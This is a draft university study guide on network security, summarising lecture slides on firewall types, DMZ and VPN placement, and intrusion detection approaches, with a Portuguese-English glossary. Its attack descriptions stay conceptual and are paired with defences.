---
title: "ICP473 P3 study guide"
place: Rio de Janeiro, Brasil
date: 2026-10-01T13:06:28-03:00
lang: en
type: note
draft: true
epub: true
plum: false

---

<script setup>
import DrawablePen from '../../src/components/DrawablePen.vue'
</script>

<DrawablePen :cloudStorage="true" penEmoji="🖉" strokeColor="#1d4ed8" />

<DrawablePen :cloudStorage="true" penEmoji="🖉" strokeColor="#dc2626" />

<DrawablePen :cloudStorage="true" penEmoji="🖌️" strokeColor="rgba(250,204,21,0.4)" :strokeWidth="20" />

<DrawablePen :cloudStorage="true" penEmoji="🖌️" strokeColor="rgba(236,72,153,0.35)" :strokeWidth="20" />

**Scope:** slides 448 to 619 (Lectures 14 to 16), plus exercise lists 8 and 9.

> **Scope assumption.** The course presentation slide lists only P1 and P2, but this term has
> three exams. P1 covered slides 1 to 248. This page assumes that P2
> covers slides 249 to 447 (modes of operation, hash, asymmetric, IPsec, TLS) and that P3
> covers slides 448 to 619: Lecture 14 firewalls, Lecture 15 IDS/IPS, Lecture 16 software
> vulnerabilities, with lists 8 and 9. The deck has 619 pages, so 619 is the last slide.
> Each lecture is one Part, so a boundary change only moves a Part.

---

[[toc]]

## 0b. Portuguese to English glossary

| Portuguese                       | English                          |
| -------------------------------- | -------------------------------- |
| perímetro de rede                | network perimeter                |
| rede confiável / não confiável   | trusted / untrusted network      |
| ponto de gargalo                 | choke point                      |
| defesa em profundidade           | defence in depth                 |
| política de acesso               | access policy                    |
| avaliação de risco               | risk assessment                  |
| filtro de pacotes                | packet filter                    |
| sem estado / com estado          | stateless / stateful             |
| tabela de estado                 | state table                      |
| filtro positivo / negativo       | positive / negative filter       |
| política padrão                  | default policy                   |
| descartar                        | discard (drop)                   |
| encaminhar                       | forward                          |
| regra implícita                  | implicit rule                    |
| porta bem conhecida              | well-known port                  |
| carga útil                       | payload                          |
| cabeçalho                        | header                           |
| falsificação de endereço IP      | IP address spoofing              |
| fragmento minúsculo              | tiny fragment                    |
| proxy de aplicação               | application-level gateway        |
| proxy de circuito                | circuit-level gateway            |
| conexão emendada                 | spliced connection               |
| host bastião                     | bastion host                     |
| sistema reforçado                | hardened system                  |
| zona desmilitarizada (DMZ)       | demilitarised zone               |
| roteador de borda                | boundary (border) router         |
| firewall distribuído             | distributed firewall             |
| modo furtivo                     | stealth mode                     |
| varredura de portas              | port scan                        |
| superfície de ataque             | attack surface                   |
| intrusão / intruso               | intrusion / intruder             |
| detecção / prevenção de intrusão | intrusion detection / prevention |
| assinatura                       | signature                        |
| anomalia                         | anomaly                          |
| detecção de mau uso              | misuse detection                 |
| linha de base                    | baseline                         |
| falso positivo / falso negativo  | false positive / false negative  |
| falácia da taxa-base             | base-rate fallacy                |
| rastro de chamadas de sistema    | system call trace                |
| registro de auditoria            | audit record                     |
| soma de verificação              | checksum                         |
| sensor em linha / passivo        | inline / passive sensor          |
| derivação                        | tap                              |
| modo promíscuo                   | promiscuous mode                 |
| pote de mel / sistema-isca       | honeypot / decoy system          |
| isca                             | bait                             |
| escalação de privilégio          | privilege escalation             |
| movimentação lateral             | lateral movement                 |
| apagar rastros                   | covering tracks                  |
| pichação de site                 | website defacement               |
| limiar                           | threshold                        |
| estouro de buffer                | buffer overflow                  |
| leitura excessiva de buffer      | buffer over-read                 |
| entrada não validada             | unvalidated input                |
| injeção                          | injection                        |
| programação defensiva            | defensive programming            |
| falhar de forma graciosa         | fail gracefully                  |
| lista branca / lista negra       | whitelist / blacklist            |
| canonicalização                  | canonicalisation                 |
| serialização                     | serialisation                    |
| condição de corrida              | race condition                   |
| impasse                          | deadlock                         |
| vazamento de memória             | memory leak                      |
| menor privilégio                 | least privilege                  |
| variável de ambiente             | environment variable             |
| sequência de escape              | escape sequence                  |
| conversão de tipo                | type cast                        |
| teste com dados aleatórios       | fuzzing                          |
| ameaça persistente avançada      | advanced persistent threat (APT) |

---

## 1. Map of the material

| Lecture | Topic                                           | Slides     |
| ------- | ----------------------------------------------- | ---------- |
| 14      | Firewalls, types, bastion host, DMZ, VPN        | 448 to 508 |
| 15      | Intruders, IDS/IPS, HIDS, NIDS, honeypots       | 509 to 564 |
| 16      | Software vulnerabilities, defensive programming | 565 to 619 |

Exercise lists in scope:

- **List 8:** firewalls (Lecture 14). Solved in section 4.
- **List 9:** IDS/IPS and the Snort rule (Lecture 15). Solved in section 5.
- Lecture 16 has no exercise list. Deck V and the essay skeleton E5 cover it.

---

## PART 1: Firewalls (Lecture 14)

### 1.1 Why firewalls exist

A firewall protects a local system or a network against network based threats.
**The dilemma (slide 450):** protect the internal assets, and at the same time allow access
to the outside world (WANs and the Internet).

**The six stages of system evolution (slides 451 and 452):**

1. Centralised system (mainframe with directly connected terminals).
2. Local area networks (LANs) connecting PCs and terminals to each other and to the mainframe.
3. Premises network: several LANs connecting PCs, servers and perhaps mainframes.
4. Enterprise-wide network: several premises networks, geographically distributed,
   connected by a private WAN.
5. Internet connectivity: the premises networks connect to the Internet, beyond the private WAN.
6. Enterprise cloud: virtualised servers in data centres, providing internal and external services.

**Why security per machine is not enough (slides 453 and 454):** a network with hundreds or
thousands of systems runs several operating systems. When a security flaw is found, every
affected system must be patched. That needs scalable configuration management and aggressive
patching. It is hard, and in some cases not cost effective. The firewall is the widely accepted
alternative, or complement, to host based security.

### 1.2 Perimeter defence and design goals

**Position (slide 455):** between the premises network and the Internet.
**Objective:** a controlled link, an external security wall (the **perimeter**,
_perímetro_), protection against Internet based attacks.

**Choke point (_ponto de gargalo_):** a single point where security and auditing can be
imposed. The firewall can be one computer, or two or more systems that cooperate.
**Result:** defence in depth (_defesa em profundidade_), the classical military doctrine.
The firewall adds a layer that isolates the internal systems.

**The three design goals, from [BELL94] (slide 456):**

1. **Traffic centralisation:** all traffic, in both directions, passes through the firewall.
   How: physically block every other path into the local network.
2. **Authorisation control:** only traffic authorised by the local security policy passes.
   How: the access policy.
3. **Immunity of the firewall:** the firewall itself is immune to penetration.
   How: a hardened system with a secure operating system.

### 1.3 The access policy

**Access policy (_política de acesso_, slide 457):** the list of traffic types authorised to
pass the firewall. Criteria: address ranges, protocols, applications, content types.

**Development of the policy:** it comes from the **risk assessment** and from the
organisation's information security policy. It starts broad (which traffic types the
organisation must support), is refined into specific **filter elements**, and is implemented
in the firewall topology. The policy dictates the rules, not the reverse.

**Four characteristics the policy can filter on (NIST SP 800-41, slides 458 and 459):**

| Characteristic          | Controls access by                                 | Used by                    |
| ----------------------- | -------------------------------------------------- | -------------------------- |
| IP address and protocol | Source and destination addresses, ports, direction | Packet filters, stateful   |
| Application protocol    | The authorised data of the application protocol    | Application-level gateway  |
| User identity           | Who the user is, typically inside users            | Needs IPsec authentication |
| Network activity        | Time, request rate (scanning), activity patterns   | Any                        |

Examples for the application protocol: check e-mail (SMTP) for spam, or HTTP requests for
authorised sites.

### 1.4 Capabilities and limitations

**Four capabilities (slide 460):**

1. **Single choke point.** Keeps unauthorised users out, prohibits vulnerable services from
   entering or leaving, protects against IP spoofing and routing attacks. It simplifies
   security management.
2. **A location for monitoring:** audits and alarms.
3. **A platform for non-security Internet functions:** NAT (maps local addresses to Internet
   addresses) and network management (logs Internet use).
4. **A platform for IPsec:** VPNs through the IPsec tunnel mode.

**Four limitations (slide 461):**

1. It does not protect against attacks that **bypass** it: internal systems with their own
   ISP link (mobile or wired broadband), LANs with direct links to partner organisations.
2. It does not fully protect against **internal threats**: a disgruntled employee, or an
   employee who unknowingly cooperates with an attacker (phishing).
3. **Insecure wireless LANs** can be reached from outside. Internal firewalls cannot stop
   direct wireless communication between systems on opposite sides of the firewall.
4. **Infected portable devices (BYOD):** a laptop, PDA or pen drive infected outside and
   then connected inside, carrying the threat.

### 1.5 Filtering logic and default policies

A firewall can monitor traffic at several levels (slide 464): low level packets, alone or as
a flow; all traffic inside a transport connection; details of application protocols.
The access policy decides the level.

| Filtering logic                         | Rule                                            | Last rule               |
| --------------------------------------- | ----------------------------------------------- | ----------------------- |
| **Positive filter** (_filtro positivo_) | Passes only packets that meet specific criteria | A **deny** at the end   |
| **Negative filter** (_filtro negativo_) | Rejects any packet that meets certain criteria  | An **allow** at the end |

What the firewall examines depends on the type: one or more protocol headers of each
packet, the payload of each packet, or the pattern of a sequence of packets.

**The two default policies (slide 466):**

| Policy        | Default discard                                 | Default forward                                   |
| ------------- | ----------------------------------------------- | ------------------------------------------------- |
| Motto         | "What is not expressly permitted is prohibited" | "What is not expressly prohibited is permitted"   |
| Security      | More conservative, more secure                  | Reduced                                           |
| Start         | Everything blocked, services added case by case | Everything open                                   |
| Users         | More visible, seen as an obstacle at first      | Easier for end users                              |
| Administrator | Adds services on demand                         | Must react to each new threat as it becomes known |
| Who uses it   | Business and government                         | More open organisations, e.g. universities        |

A packet filter is a list of rules. The firewall compares the IP and TCP headers of each
packet with the list, top to bottom. On a match the rule's action runs (forward or discard).
With no match the default action runs.

### 1.6 Type 1: packet filtering firewall

**Definition (slide 465):** applies a set of rules to each IP packet, inbound and outbound,
and forwards or discards it. The rules use layer 3 and layer 4 information:

1. Source IP address.
2. Destination IP address.
3. Source and destination port (TCP or UDP), which identifies the application (SNMP, HTTP).
4. IP protocol field: the transport protocol (TCP, UDP, ICMP).
5. Interface: on firewalls with three or more ports, which interface the packet came from
   or goes to.

**Table 9.1, the SMTP example (slides 467 and 468).** Goal: allow inbound and outbound
e-mail (SMTP, port 25), block everything else.

| Rule | Direction | Src address | Dest address | Protocol | Dest port | Action |
| ---- | --------- | ----------- | ------------ | -------- | --------- | ------ |
| 1    | In        | External    | Internal     | TCP      | 25        | Permit |
| 2    | Out       | Internal    | External     | TCP      | > 1023    | Permit |
| 3    | Out       | Internal    | External     | TCP      | 25        | Permit |
| 4    | In        | External    | Internal     | TCP      | > 1023    | Permit |
| 5    | Either    | Any         | Any          | Any      | Any       | Deny   |

Rule 1 permits inbound mail, rule 2 the reply to it, rule 3 outbound mail, rule 4 the reply
to it. Rule 5 is the default policy, always last, explicit or implicit.

**The flaw:** rule 4 is too permissive. It allows external traffic to **any** destination
port above 1023, on the assumption that it is a reply.

**The exploit (slide 469):** an external attacker opens a connection from port 5150 to an
internal web proxy on port 8080. Rule 4 permits it, because 8080 is above 1023.

**First refinement:** add the **source port** to the rules. Rules 2 and 4 (replies) get
source port 25, because the reply to an e-mail comes from port 25 of the server.
Rules 1 and 3 (new connections) get source port > 1023, because a client starting a mail
connection uses a high port.

**The remaining vulnerability (slide 470):** port 25 for SMTP is only a default. An external
attacker can run another application on port 25 and send packets **from source port 25** to
internal machines. Revised rule 4 accepts them as replies.

**The solution: the ACK flag (slides 471 and 472).** Rule 4 also requires the ACK flag set.
A packet that belongs to an established TCP connection, such as a legitimate SMTP reply,
always has ACK set. A packet that starts a new connection has SYN and no ACK.

| Rule | Direction | Src address | Src port | Dest address | Protocol | Dest port | Flag | Action |
| ---- | --------- | ----------- | -------- | ------------ | -------- | --------- | ---- | ------ |
| 4    | In        | External    | 25       | Internal     | TCP      | > 1023    | ACK  | Permit |

**Three advantages (slide 473):** simplicity (rule logic on L3 and L4 headers), transparency
(no client configuration), speed (no payload inspection).

**Five weaknesses, NIST SP 800-41 (slides 474 and 475):**

1. **No upper layer data.** It cannot prevent attacks that use application specific
   vulnerabilities. If the application is allowed, all of its functions are allowed.
2. **Limited logging.** The log holds only what was used for the decision: addresses and
   traffic type.
3. **No advanced user authentication.** Same cause: no upper layer functionality.
4. **Vulnerable to attacks on the TCP/IP stack**, such as network layer address spoofing.
   Many filters cannot detect altered layer 3 addressing.
5. **Susceptible to misconfiguration.** Few variables in the decision make it easy to permit
   traffic that should be denied.

**Two attacks and their countermeasures (slides 476 and 477):**

- **IP address spoofing.** The intruder sends packets from outside with the source address
  of a trusted internal host, to penetrate systems that trust internal addresses.
  Countermeasure: discard any packet that arrives on the external interface with an internal
  source address.
- **Tiny fragment attack.** The intruder uses IP fragmentation to push the TCP header, with
  the ports, into a second fragment. The first fragment holds only the IP header. The filter
  decides on the first fragment, and the attacker hopes the rest passes.
  Countermeasure: require a minimum amount of the transport header in the first fragment.
  If the first fragment is rejected, remember the packet ID and discard the following
  fragments.

**The root problem: lack of context (slide 478).** A stateless filter decides packet by
packet and ignores whether a TCP connection exists. A server uses a fixed well-known port
below 1024 (SMTP: 25). A client uses a dynamic temporary port above 1024 (for example
49152). To allow the reply from port 25 to port 49152, the filter must open **all** high
ports (> 1023) inbound. That is an enormous vulnerability.

### 1.7 Type 2: stateful inspection firewall

**The solution (slide 479):** tighten the rules for TCP traffic. The firewall creates and
maintains a **state table** (_tabela de estado_, Table 9.2) of the outbound TCP connections
that are active, one entry per established connection. Inbound traffic to high ports is
allowed **only** if the packet fits one of the entries.

Table 9.2, example rows (slide 481):

| Source address | Source port | Destination address | Destination port | State       |
| -------------- | ----------- | ------------------- | ---------------- | ----------- |
| 192.168.1.100  | 1030        | 210.9.88.29         | 80               | Established |
| 192.168.1.101  | 1033        | 173.66.32.122       | 25               | Established |
| 192.168.1.106  | 1035        | 177.231.32.12       | 79               | Established |
| 223.43.21.231  | 1990        | 192.168.1.6         | 80               | Established |

**Capabilities (slide 480):** it reviews the same L3 and L4 headers as a packet filter,
**and** records the state of the TCP connection (established, closing). Advanced features in
some products: **TCP sequence number tracking**, against attacks such as session hijacking;
**limited application inspection (DPI)**, useful for problematic protocols (FTP, IM, SIPS) to
identify and track related data connections.

### 1.8 Type 3: application-level gateway (application proxy)

**Mechanism (slide 482):** a relay of application level traffic (Telnet, FTP). The user
contacts the gateway. The gateway asks for the remote host and the credentials. If valid,
the gateway itself contacts the application on the remote host and relays the TCP segments
between the two endpoints. Two **spliced** connections exist: client to gateway, and gateway
to server. There is no end-to-end connection.

**Properties (slide 483):**

- **Granular control.** If the gateway has no proxy code for an application, the service is
  not supported. It can support only specific features of an application, for example permit
  HTTP GET and deny POST.
- **More secure than packet filters.** It analyses a few permitted applications instead of
  countless combinations of IP, port and flags.
- **Auditing.** Easy to log and audit all traffic at the application level.
- **Disadvantage: processing overhead.** It examines and forwards all traffic on both
  spliced connections.

### 1.9 Type 4: circuit-level gateway and SOCKS

**Mechanism (slide 484):** a stand-alone system or a specialised function of an
application-level gateway. It does not permit an end-to-end TCP connection. It sets up two
TCP connections: internal host to gateway, and gateway to external host.
**Key difference:** once the connections exist, it relays TCP segments **without examining
the payload**. The security function is only to decide which connections are permitted.

**Typical hybrid use:** when the administrator trusts the internal users. Inbound uses an
application proxy (expensive, secure). Outbound uses a circuit-level gateway (cheap), because
examining outgoing data is not worth the processing.

**SOCKS version 5, RFC 1928 (slides 485 and 486):** a framework for client-server
applications (TCP and UDP) to use the services of a firewall conveniently and securely.
It is a **shim layer** between the application layer and the transport layer. It is not a
network layer gateway, so it does not forward ICMP.

Components: the **SOCKS server** on the firewall (UNIX, Windows), the **SOCKS client
library** on the protected internal hosts, and **SOCKS-ified clients** (FTP, Telnet)
recompiled or relinked with the library.

TCP flow:

1. The internal client opens a TCP connection to the SOCKS server on **port 1080**.
2. The client negotiates the authentication method.
3. The client authenticates.
4. The client sends a relay request ("connect to IP 1.2.3.4, port 80").
5. The SOCKS server evaluates the request and, if permitted, opens the external connection.

UDP: a TCP connection to port 1080 is opened first, only to authenticate the user. UDP
segments are then relayed while that control connection stays open.

### 1.10 The four types compared

| Type                      | Layer       | Examines                          | State | Payload | Cost    |
| ------------------------- | ----------- | --------------------------------- | ----- | ------- | ------- |
| Packet filter (stateless) | L3, L4      | Headers of each packet            | No    | No      | Lowest  |
| Stateful inspection       | L3, L4      | Headers plus the connection state | Yes   | Limited | Low     |
| Circuit-level gateway     | Transport   | Which connections are permitted   | Yes   | No      | Medium  |
| Application-level gateway | Application | Application commands and content  | Yes   | Yes     | Highest |

### 1.11 Firewall basing: bastion host and other platforms

**Platforms (slide 487):** a stand-alone dedicated machine with a common OS (UNIX, Linux),
or a pre-configured security appliance. Alternatives: a software module in a router, a LAN
switch or a server.

**Bastion host (_host bastião_, slide 488):** a system identified by the firewall
administrator as a **critical strong point** of the network security. It serves as the
platform for application-level or circuit-level gateways, and can support other services
(IPsec). Its hardware runs a secure version of its OS: a **hardened system**.

**Characteristics (slides 489 to 492):**

1. **Minimal services:** only the services the administrator considers essential are
   installed, for example proxies for DNS, FTP, HTTP and SMTP.
2. **Extra authentication:** the host may require authentication before the proxies, and
   each proxy may require its own.
3. **Command subset:** each proxy supports only a subset of the application commands.
4. **Restricted hosts:** each proxy allows access only to specific internal hosts.
5. **Detailed logging:** each proxy logs all traffic, each connection and its duration.
   An essential tool to discover and stop attacks.
6. **Small software:** each proxy is a very small package designed for security. A UNIX mail
   application has more than 20,000 lines; a mail proxy has under 1,000. Easier to audit.
7. **Independence:** proxies are independent. A vulnerable one is uninstalled without
   affecting the others. A new service is a new proxy.
8. **No disk access:** a proxy reads only its initial configuration file. The executable
   parts of the file system can be read only, which hinders Trojan horses and sniffers.
9. **No privileges:** each proxy runs as a non-privileged user in a private secure directory.

**Host-based firewalls (slide 493):** a software module that protects one host, in the OS or
as an add-on, commonly on a server. Three advantages: rules tailored to the host; protection
independent of the topology (internal and external attacks pass the host firewall); an
additional layer, so new servers join the network without changing the network firewall.

**Firewalls in network devices (slide 494):** packet filtering and stateful inspection in
routers and switches, as additional layers together with bastion hosts and host firewalls.

**Virtual firewalls (slide 495):** in virtualised environments, either a virtual appliance
(a bastion host as a VM) or firewall capabilities in the hypervisor.

**Personal firewalls (slides 497 to 500):** control traffic between a personal computer and
the network, at home or in corporate intranets. Implemented as a software module on the PC,
or in the home router connected to the DSL or cable modem. Much simpler than server or
stand-alone firewalls. Main function: deny unauthorised remote access. Secondary function:
monitor outgoing activity to detect malware such as worms. Implementations: **netfilter**
(Linux), **pf** (BSD and macOS), **Windows Firewall**. Configured by CLI or GUI.

Default policy: inbound connections denied except those the user permits; outbound
permitted. Services that can be re-enabled, with ports: SSH 22, FTP 20 and 21, Windows
sharing 139, SMB without NetBIOS 445, VNC 5900 to 5902, Network Time 123, printer sharing
631 and 515, personal web sharing 80 and 427, CVS 2401, IRC 194.

**The FTP rule:** enabling FTP opens ports 20 and 21 locally. If others connect from ports
20 or 21, ports 1024 to 65535 open for the FTP data connection.

**Advanced features:** **stealth mode** (drop unsolicited packets so the system appears
absent), **UDP blocking** (only TCP to open ports), **logging**, **application filter**
(only selected applications, or applications signed by a valid CA, may provide services).

### 1.12 Locations: DMZ, VPN and distributed firewalls

**DMZ (slides 502 and 503):** an extra network segment between an **external firewall** at
the network edge (just after the Internet or WAN boundary router) and one or more
**internal firewalls** that protect the bulk of the enterprise network. The DMZ holds
systems that must be reachable from outside but still need protection: the corporate web
site, the e-mail server (SMTP), the DNS server. Figure 9.2 (slide 496) shows boundary
router, external firewall, DMZ with web, e-mail and DNS servers, internal firewall, then
application and database servers and workstations.

The external firewall gives moderate access control to the DMZ systems and basic protection
to the rest. **Three purposes of the internal firewall:**

1. Stricter filtering than the external one, to protect internal servers and workstations.
2. Two-way protection against the DMZ: it protects the internal network from a compromised
   DMZ server (malware, rootkits, bots), and protects the DMZ from the internal network.
3. Internal segmentation: several internal firewalls protect portions of the internal network
   from each other (servers against workstations).

**VPN (slides 504 to 506):** organisations with dispersed LANs must interconnect. The public
Internet is cheaper and easier to manage than private lines, but it exposes corporate traffic
(eavesdropping, unauthorised access). A VPN is a set of computers interconnected over an
insecure network, using encryption and authentication at lower protocol layers, with the
same cryptographic system at both ends. The most common protocol is **IPsec**.

The IPsec device (router or firewall) encrypts and compresses all traffic to the WAN, and
decrypts and decompresses all traffic from it, transparently for the LAN hosts. A remote
individual user can run IPsec on the workstation, which must then have high host security,
making it an attractive target.

**Where to put IPsec:**

| Position                       | Problem                                                   |
| ------------------------------ | --------------------------------------------------------- |
| Behind the firewall (internal) | Encrypted VPN traffic: no filtering, scan, log or control |
| In the boundary router         | The router is probably less secure than the firewall      |
| **In the firewall itself**     | The functional choice                                     |

**Distributed firewalls (slide 507):** stand-alone network firewalls plus host-based
firewalls on servers and workstations, working together under **central administrative
control**. Administrators configure hundreds of host firewalls and personal firewalls, local
and remote, and monitor security across the network. Advantages: protection against internal
attacks, and protection tailored to specific machines and applications.

External material:

- NIST CSRC, article: [SP 800-41 Rev. 1, Guidelines on Firewalls and Firewall Policy](https://csrc.nist.gov/pubs/sp/800/41/r1/final)
  The publication the slides cite for the policy characteristics and the packet filter weaknesses.
- IETF, article: [RFC 1928, SOCKS Protocol Version 5](https://www.rfc-editor.org/rfc/rfc1928)
  The circuit-level gateway standard, with the port 1080 handshake.

---

## PART 2: Intrusion detection and prevention (Lecture 15)

### 2.1 Intruders

Intruders are one of the main threats (slide 510). Most violations come from **outsiders**,
some from **insiders**, and insiders can be much more dangerous. Targeted attacks can bypass
the perimeter defences (firewalls), so defence in depth is needed.

**Four classes of intruder (slides 511 and 512):**

1. **Cyber criminals.** Motivation: financial reward. Activities: identity theft, theft of
   financial credentials, corporate espionage, data theft or ransom. They organise in
   underground forums (DarkMarket) to trade data and coordinate attacks.
2. **Activists.** Motivation: social or political causes. Skill level often low. Activities:
   website defacement, DoS, data leaks. Examples: Anonymous, LulzSec, Manning, Snowden.
3. **APTs (Advanced Persistent Threats).** Government sponsored hacker groups. Motivation:
   espionage or sabotage. The name comes from their secrecy and persistence over long
   periods. Widespread: China, Russia, USA, UK.
4. **Others.** Classic hackers, motivated by the technical challenge or by reputation in the
   group; they discover new vulnerabilities, such as buffer overflow. Hobby hackers use ready
   made attack toolkits and may be recruited by the other classes.

**Examples of intrusion, NIST SP 800-61 (slides 513 and 514):** remote root compromise of a
mail server; web server defacement; guessing and cracking passwords; copying a database of
credit card numbers; viewing sensitive data (payroll, medical records) without authorisation;
running a packet sniffer on a workstation to capture user names and passwords; using a
permission error on an anonymous FTP server to distribute pirated software and music;
accessing an insecure system to reach the internal network; social engineering.

### 2.2 Role and limits of IDS and IPS

**IDS:** intrusion detection system. **IPS:** intrusion prevention system (slide 515).

- **Where they work well:** reasonably effective against known, less sophisticated attacks,
  for example activist groups or large scale e-mail scams.
- **Where they fail:** less effective against sophisticated targeted attacks, from cyber
  criminals or state sponsored APTs, because those attackers use **zero-day exploits** and
  know how to hide their activity on the system.
- **Defence in depth:** the IDS/IPS must be part of a strategy that includes cryptography,
  audit trails, strong authentication and active security management.

### 2.3 The attack methodology

Intruder behaviour changes constantly, but a common methodology exists (slide 516):
**phishing, malware installation, credential theft, compromise.** Six steps:

1. **Target acquisition and information gathering** (slides 516 and 519). OSINT (open
   source intelligence), public information, network mapping tools. Goal: identify and
   characterise the target systems. Examples: explore the corporate site (structure, staff,
   OS); DNS lookup (dig, host) and WHOIS; map services with NMAP; send a probe e-mail
   (to customer service) to analyse the mail client and server; identify vulnerable services
   such as a web CMS.
2. **Initial access.** Exploit a remote network vulnerability, exploit weak credentials, or
   install malware through social engineering or a targeted download. Examples: brute force
   the CMS password; exploit a CMS plugin; targeted spear-phishing e-mail with a link to a
   browser exploit.
3. **Privilege escalation** (slides 517 and 520). Actions inside the system after initial
   access, exploiting local access vulnerabilities to raise the attacker's privileges.
   Examples: scan the system for applications with local exploits; exploit one to gain root
   or admin; install sniffers to capture administrator passwords; use them to reach
   privileged information.
4. **Information gathering or system exploitation.** Access or modify information and
   resources; possibly move to another target (lateral movement). Examples: scan files for
   financial data or PII; transfer many documents to an external repository (exfiltration);
   use captured passwords on other servers.
5. **Maintaining access** (slides 518 and 521). Persistence: backdoors or other malware,
   secret authentication credentials, other configuration changes. Examples: install a
   remote administration tool (RAT) or a rootkit with a backdoor; reuse the captured admin
   password later; modify or disable antivirus or IDS on the system.
6. **Covering tracks.** Disable or edit audit logs to remove evidence; rootkits hide files
   and code. Examples: hide the RAT and sniffers with a rootkit; edit log files to remove
   the entries generated during the intrusion.

### 2.4 Definitions and components of an IDS

- **Security intrusion (slide 522):** an unauthorised act of bypassing the security
  mechanisms of a system.
- **Intrusion detection:** a hardware or software function that collects and analyses
  information from several areas inside a computer or network, to identify possible
  security intrusions.

**Three logical components (slide 523):**

1. **Sensors** collect data. The input can be any part of the system that holds evidence of
   intrusion: network packets, log files, system calls. They forward it to the analyser.
2. **Analysers** receive input from one or more sensors and decide whether an intrusion
   occurred. The output may include evidence and guidance on actions. Sensor data may be
   stored for later analysis.
3. **User interface** lets the administrator view the system or control its behaviour.

**Architecture (slide 524):** simple (one sensor and one analyser, a HIDS or a NIDS) or
distributed (several sensors on hosts and network devices feeding a central analyser).

**Classification by data source:**

| Type                  | Monitors                                            | Examples                  |
| --------------------- | --------------------------------------------------- | ------------------------- |
| HIDS (host-based)     | One host: its characteristics and the events on it  | Process IDs, system calls |
| NIDS (network-based)  | The network traffic of specific segments or devices | Suspicious traffic        |
| Distributed or hybrid | Several HIDS and NIDS sensors in a central analyser | Better identification     |

**IPS:** the slides define the IPS through the inline sensor (slide 552): a sensor that the
traffic must pass through, so it can **block** an attack when detected. The IDS detects and
alerts; the IPS also prevents.

### 2.5 Motivations, the fundamental assumption and the trade-off

**Three motivations (slide 525):**

1. **Fast detection.** Detected soon enough, the intruder is ejected before damage. Even when
   not in time to preempt, earlier detection means less damage and faster recovery.
2. **Deterrent effect.** An effective IDS discourages attacks, which prevents intrusions.
3. **Information gathering.** Data about intrusion techniques strengthens prevention
   (firewall rules, patches).

**The fundamental assumption (slide 526):** the behaviour of an intruder differs from the
behaviour of a legitimate user in ways that can be quantified. There is no crisp distinction
between an attack and normal use. Some **overlap** exists, and the analyser's job is to
minimise it.

**The trade-off (slide 527):**

| Interpretation | Tries to                            | Result                                            |
| -------------- | ----------------------------------- | ------------------------------------------------- |
| Loose          | Catch as many intruders as possible | Many **false positives**: users seen as intruders |
| Tight          | Limit false positives               | More **false negatives**: intruders missed        |

The ideal: maximise the detection rate and minimise the false alarm rate. IDS practice is a
compromise and an art.

**The classical view (slide 528):** outsiders can be distinguished from legitimate users with
reasonable confidence, because patterns of legitimate behaviour come from the history, and
significant deviations (anomalies) are detectable. **Insiders** are the hardest case
(Anderson): the difference between the abnormal and normal behaviour of an insider can be
very small, so anomaly search alone is insufficient. Suggested solution: an intelligent
definition of conditions (rules) that suggest unauthorised use.

**The base-rate fallacy (slide 529):** the two goals, high detection rate and low false
alarm rate, are extremely hard to reach together. The real number of intrusions (the base
rate) is very low compared with legitimate use. Unless the IDS is extremely discriminating,
almost perfect, the false alarm rate will be high. Frequent false alarms make managers ignore
them, or waste much time analysing them. A low detection rate gives a false sense of security.

### 2.6 Requirements of an IDS

Nine requirements (slides 530 and 531). An IDS must:

1. Run continuously with minimal human supervision.
2. Be fault tolerant: recover from crashes and restarts.
3. Resist subversion: monitor itself and detect modification by an attacker.
4. Impose minimal overhead on the monitored system.
5. Be configurable according to the security policies of the monitored system.
6. Adapt to changes in system and user behaviour over time.
7. Scale to monitor a large number of hosts.
8. Avoid a complete stop of service: if some components stop, the rest is affected as little
   as possible.
9. Allow dynamic reconfiguration without a restart.

### 2.7 Analysis approaches: anomaly and signature

Two approaches (slide 532): **anomaly detection** and **signature or heuristic detection**.

**Anomaly detection (slides 533 and 534):** collect data on the behaviour of legitimate users
over time, building a **baseline** of normal. Two phases:

1. **Training phase:** build a model of legitimate behaviour from sensor data during normal
   operation. It can happen at distinct moments or be a continuous evolution of the model.
2. **Detection phase:** compare observed behaviour with the model and classify it as
   legitimate or anomalous.

**Three categories of anomaly classification (slides 535 to 539):**

1. **Statistical (slide 536).** A statistical profile of the observed metrics. Univariate
   treats each metric as independent (crude, ineffective). Multivariate considers
   correlations between metrics (better discrimination). Time series uses the order and the
   time between events (better still). Advantages: relative simplicity, low computational
   cost, no assumptions about expected behaviour. Disadvantages: hard to select adequate
   metrics (the balance of false positives and negatives); not all behaviour can be
   modelled this way.
2. **Knowledge-based (slide 537).** An expert system classifies observed data with a set of
   rules that model legitimate behaviour. In the training phase the rules are developed,
   possibly by hand, to characterise the training data in distinct classes, with formal
   tools such as finite state machines and description languages. Advantages: robustness
   and flexibility. Disadvantages: difficulty and time to develop high quality rules; human
   experts needed.
3. **Machine learning (slide 538).** Data mining techniques develop the model automatically
   from the normal training data. Training needs significant time and computational
   resources; once the model exists, classification is usually efficient. Advantages:
   flexibility, adaptability, captures complex interdependencies between metrics.
   Disadvantages: depends on assumptions about accepted behaviour; the false alarm rate is
   currently unacceptably high; high resource cost to train.

Machine learning approaches tried with varied success: Bayesian networks (probabilistic
relations), Markov models (states with transition probabilities), neural networks, fuzzy
logic (approximate reasoning, accommodates uncertainty), genetic algorithms (develop
classification rules), clustering and outlier detection (new data inside a cluster is normal,
an outlier is an anomaly).

**Signature or heuristic detection (slides 540 to 542),** also called **misuse detection:**
a set of known malicious patterns or attack rules. The observed behaviour is compared with
them. A match means an intruder.

- **Signatures** compare collected data with known patterns of malicious data. They need
  enough detail to minimise false alarms and still detect a sufficient fraction of
  malicious data. Used widely in antivirus products, network traffic scanning proxies and
  NIDS. **Advantages:** relatively low cost in time and resources, wide acceptance.
  **Disadvantages:** significant effort to identify and review new behaviour to build
  signatures; **cannot detect zero-day attacks**, where no signature exists.
- **Heuristics** use rules to identify known attacks, or attacks on known weaknesses, and
  suspicious behaviour even inside the established usage patterns. The most fruitful source
  of rules is the analysis of attack tools and scripts collected on the Internet,
  supplemented by rules from experts. Rules are typically specific to the machine and OS.
  **Snort** is a rule based NIDS with a large collection of rules.

**Comparison for list 9:**

| Criterion        | Signature detection                    | Anomaly detection                          |
| ---------------- | -------------------------------------- | ------------------------------------------ |
| Detects          | Known, catalogued behaviour            | Deviations from the baseline, unknown too  |
| Zero-day attacks | No: no signature exists                | Possible: the attack deviates from normal  |
| False positives  | Low, if signatures are detailed        | Higher: overlap; ML rate unacceptable now  |
| Cost             | Low at run time; effort to write rules | Training (ML expensive); experts for rules |
